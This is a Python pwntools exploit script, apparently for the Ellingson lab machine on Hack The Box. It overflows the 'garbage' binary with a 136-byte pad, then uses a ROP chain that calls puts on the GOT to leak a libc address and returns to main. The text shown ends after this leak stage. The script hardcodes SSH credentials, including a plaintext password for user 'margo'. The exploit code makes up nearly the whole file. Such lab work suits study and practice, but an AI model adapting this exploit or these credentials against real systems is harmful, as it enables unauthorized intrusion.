#!/usr/bin/env python

import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
debugging = False
gdb_cmd = [
    "c"
]

# Binary names
bin_fname = './garbage'
libc_fname = '/usr/lib/x86_64-linux-gnu/libc.so.6'

# Remote
IP = 'ellingson.htb'
PORT = 22

# SSH
URL = 'ellingson.htb'
username = 'margo'
password = 'iamgod$08'
bin_abs_path = '/usr/bin/garbage'

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
    p = remote(IP, PORT)
elif args.local or args.attach:
    p = process(proc_args)
    if args.attach:
        gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
    s = ssh(host=URL, user=username, password=password)
    s.set_working_directory(bin_abs_path)
    p = s.process(proc_args)
else:
    p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
    debugging = True


# Start of exploit
log.info("Mapping binaries")
context.log_level = 'debug'
garbage = ELF(bin_fname)
rop = ROP(garbage)


# Stage 1 - Leak
junk = "A"*136
rop.search(regs=['rdi'], order = 'regs') # Finds gaget
rop.puts(garbage.got['puts']) # Finds puts
rop.call(garbage.symbols['main']) # reruns main
log.info('Stage 1 ROP Chain:\n' + rop.dump())

# raw_input()

payload = junk + str(rop)

p.sendline(payload)
garbage = p.recvuntil("access denied.") # Stops right before leak

# Cutting puts out of the output
leaked_puts = p.recv(7).strip().ljust(8, '\x00')
leaked_puts = u64(leaked_puts)
log.info("puts address is: {}".format(hex(leaked_puts)))

# p.interactive()
